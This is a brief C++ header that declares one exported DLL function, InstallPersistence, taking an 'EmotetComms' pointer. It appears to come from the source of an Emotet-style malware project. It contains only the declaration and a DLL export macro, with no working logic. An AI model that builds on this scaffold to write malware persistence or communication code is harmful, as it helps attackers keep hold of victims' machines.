#pragma once
#include "stdio.h"
#include <string>
#include "comms.h"

#ifdef PERSISTENCE_EXPORT
#define PERSISTENCE_EXPORT __declspec(dllexport)
#else
#define PERSISTENCE_EXPORT __declspec(dllimport)
#endif

PERSISTENCE_EXPORT bool InstallPersistence(EmotetComms*);